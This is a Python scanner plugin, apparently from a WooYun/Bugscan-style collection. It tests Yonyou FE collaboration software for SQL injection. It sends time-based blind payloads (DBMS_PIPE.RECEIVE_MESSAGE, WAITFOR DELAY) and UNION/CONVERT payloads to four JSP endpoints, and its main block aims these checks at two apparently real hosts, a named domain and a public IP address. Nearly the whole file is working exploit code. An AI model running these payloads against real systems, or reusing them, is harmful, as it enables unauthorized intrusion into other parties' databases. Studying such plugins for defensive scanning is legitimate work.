#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-0112747

import time

def assign(service, arg):
    if service == "yongyou_fe":
        return True, arg

        
def audit(arg): 
    payloads = [
        'fenc/syncsubject.jsp?pk_corp=1%27%20AND%201%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2871%29%7C%7CCHR%28103%29%7C%7CCHR%2873%29%7C%7CCHR%2867%29%2C5%29%20AND%20%271%27%3D%271',
        'fenc/syncsubject.jsp?pk_corp=1%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--'
        ]
    for payload1 in payloads:
        payload2 = payload1.replace('5','1')
        url1 = arg + payload1
        url2 = arg + payload2
        t1 = time.time()
        code, head,res, errcode, _ = curl.curl2(url1)
        t2 = time.time()
        code, head,res, errcode, _ = curl.curl2(url2)
        t3 = time.time()
        if code == 200 or code ==500 and 2*t2-t3-t1 > 3:
            security_hole(arg + 'fenc/syncsubject.jsp?pk_corp=1' + "   :time-based blind")
            
    payloads = [
        'indexsearch/filter.jsp?tableId=1%20UNION%20ALL%20SELECT%20NULL%2CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28111%29%7C%7CCHR%28105%29%7C%7CCHR%2868%29%7C%7CCHR%28114%29%7C%7CCHR%2875%29%7C%7CCHR%28109%29%7C%7CCHR%28106%29%7C%7CCHR%2898%29%7C%7CCHR%2867%29%7C%7CCHR%28102%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20DUAL--',
        'indexsearch/filter.jsp?tableId=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCHAR%28113%29%2bCHAR%28122%29%2bCHAR%28118%29%2bCHAR%28122%29%2bCHAR%28113%29%2bCHAR%28112%29%2bCHAR%28108%29%2bCHAR%28107%29%2bCHAR%2878%29%2bCHAR%2867%29%2bCHAR%2876%29%2bCHAR%2868%29%2bCHAR%28103%29%2bCHAR%28118%29%2bCHAR%28122%29%2bCHAR%28113%29%2bCHAR%28113%29%2bCHAR%28122%29%2bCHAR%28118%29%2bCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--'
        ]
    for payload in payloads:
        url = arg + payload
        code, head,res, errcode, _ = curl.curl2(url)
        if code == 200 or code ==500 and 'qzvzqplkNCLDgvzqqzvq' in res or 'qqvvqoiDrKmjbCfqqvpq' in res :
            security_hole(arg +'indexsearch/filter.jsp?tableId=1' + "   :sql Injection")
    
    payloads = [
        'feReport/chartList.jsp?delId=1&reportId=1%20AND%201651%3DCONVERT%28INT%2C%28SELECT%20CHAR%28113%29%2bCHAR%28113%29%2bCHAR%28112%29%2bCHAR%28118%29%2bCHAR%28113%29%2b%28SELECT%20%28CASE%20WHEN%20%281651%3D1651%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2bCHAR%28113%29%2bCHAR%28106%29%2bCHAR%2898%29%2bCHAR%28112%29%2bCHAR%28113%29%29%29',
        'feReport/chartList.jsp?delId=1&reportId=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28117%29%7C%7CCHR%2882%29%7C%7CCHR%2871%29%7C%7CCHR%28117%29%7C%7CCHR%2899%29%7C%7CCHR%2867%29%7C%7CCHR%2881%29%7C%7CCHR%2875%29%7C%7CCHR%2881%29%7C%7CCHR%28100%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28107%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%2CNULL%2CNULL%2CNULL%20FROM%20DUAL--'
        
    ]
    for payload in payloads:
        url = arg + payload
        code, head,res, errcode, _ = curl.curl2(url)
        if code == 200 or code ==500 and 'qqpvq1qjbpq' in res or 'qkvqquRGucCQKQdqzkjq' in res :
            security_hole(arg + 'feReport/chartList.jsp?delId=1&reportId=1' + "   :sql Injection")
            
            
    payloads = [
        'flex/newsmessage.jsp?uname=1%27%20AND%209694%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2899%29%7C%7CCHR%28114%29%7C%7CCHR%28112%29%7C%7CCHR%28102%29%2C5%29%20AND%20%27nxYr%27%3D%27nxYr',
        'flex/newsmessage.jsp?uname=1%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--'
        ]
    for payload1 in payloads:
        payload2 = payload1.replace('5','1')
        url1 = arg + payload1
        url2 = arg + payload2
        t1 = time.time()
        code, head,res, errcode, _ = curl.curl2(url1)
        t2 = time.time()
        code, head,res, errcode, _ = curl.curl2(url2)
        t3 = time.time()
        if code == 200 or code ==500 and 2*t2-t3-t1 > 3:
            security_hole(arg + 'flex/newsmessage.jsp?uname=1' + "   :time-based blind")
            
            
    


if __name__ == '__main__': 
    from dummy import * 
    audit(assign('yongyou_fe', 'http://oa.shunhengli.com:9090/')[1])
    audit(assign('yongyou_fe', 'http://218.90.146.246:9090/')[1])